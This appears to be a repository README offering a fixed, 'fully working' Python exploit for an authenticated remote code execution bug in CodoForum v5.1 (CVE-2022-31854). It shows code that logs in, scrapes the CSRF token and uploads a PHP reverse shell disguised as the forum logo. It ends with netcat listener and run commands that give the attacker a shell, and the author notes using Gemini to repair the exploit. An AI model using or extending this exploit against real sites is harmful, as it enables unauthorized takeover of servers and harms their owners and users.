# CodoForum v5.1 - Authenticated RCE (Fixed Exploit)
**CVE:** 2022-31854 | **EDB-ID:** 50978 

This repository contains a refined and fully working Python 3 exploit for the CodoForum v5.1 Authenticated Remote Code Execution via File Upload vulnerability. 

### Credits
* **Original Exploit Author:** Krish Pandey (@vikaran101) - [Original Medium Writeup](https://vikaran101.medium.com/codoforum-v5-1-authenticated-rce-my-first-cve-f49e19b8bc)
* **Refined & Corrected By:** Simon Fung

---

## What Was Changed & Refined?

The original exploit script on Exploit-DB contained several hardcoded values and syntax issues so gg. I made these chaanges using Gemini:

1. **Dynamic CSRF Token Extraction:** The original script hardcoded a specific CSRF token. If the target server's token didn't match, the upload failed silently, resulting in a `404 Not Found` when triggering the shell. 
2. **Fixed Hardcoded Credentials:** The original script ignored the user-supplied `-u` and `-p` arguments, hardcoding `admin:admin` (thought its default credential) inside a massive multipart string. 
3. **Removed Hardcoded Proxy:** The script forced traffic through `127.0.0.1:8080`, crashing if a local proxy (probably original for burpsuite) wasn't running. Proxy settings are now disabled by default.
4. **Cleaned Up Multipart Requests:** More clean yeh
5. **Syntax Errors Fixed:** Fixed `SyntaxWarning: invalid escape sequence` errors caused by the ASCII banner by converting it to a raw string (`r"""..."""`). When I first running the script no idea would encouter this issue.

---

## Code Comparison: Before vs. After

### 1. Handling Credentials
**Before:**
```python
def login():
    # Ignored user arguments entirely
    send_creds = "-----------------------------2838079316671520531167093219\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n-----------------------------2838079316671520531167093219\nContent-Disposition: form-data; name=\"password\"\n\nadmin\n-----------------------------2838079316671520531167093219--"
    auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds, proxies=proxy)
```

**After:**
```python
def login_and_exploit():
    # Uses CLI arguments and native requests formatting
    login_data = {"username": options.username, "password": options.password}
    r_login = session.post(loginURL, data=login_data, verify=False)
```

### 2. Handling the CSRF Token
**Before:**
```python
def uploadAndExploit():
    # Inside a massive string payload block...
    Content-Disposition: form-data; name="CSRF_token"\n\n23cc3019cadb6891ebd896ae9bde3d95\n
```

**After:**
```python
    # Extract real CSRF token from the global settings page
    r_config = session.get(globalSettings, verify=False)
    match = re.search(r'name="CSRF_token"\s+value="([^"]+)"', r_config.text)
    
    csrf_token = match.group(1) if match else "23cc3019cadb6891ebd896ae9bde3d95"
    
    # Pass dynamically to the upload payload
    files = {
        'CSRF_token': (None, csrf_token),
        'forum_logo': (f'{randomFileName}.php', rev_shell, 'application/x-php'),
        # ... other required fields
    }
    session.post(globalSettings, files=files, verify=False)
```

---

## How to use

1. Start your Netcat listener:
   ```bash
   nc -lvnp 4445
   ```
2. Run the exploit (Ensure you provide the correct URL path):
   ```bash
   python3 exploit.py -t http://<TARGET_IP>/ -u <USERNAME> -p <PASSWORD> -i <YOUR_IP> -n 4445
   ```

*Note: If CodoForum is hosted in a subdirectory, append it to the target flag (e.g., `-t http://<TARGET_IP>/somepages`).*
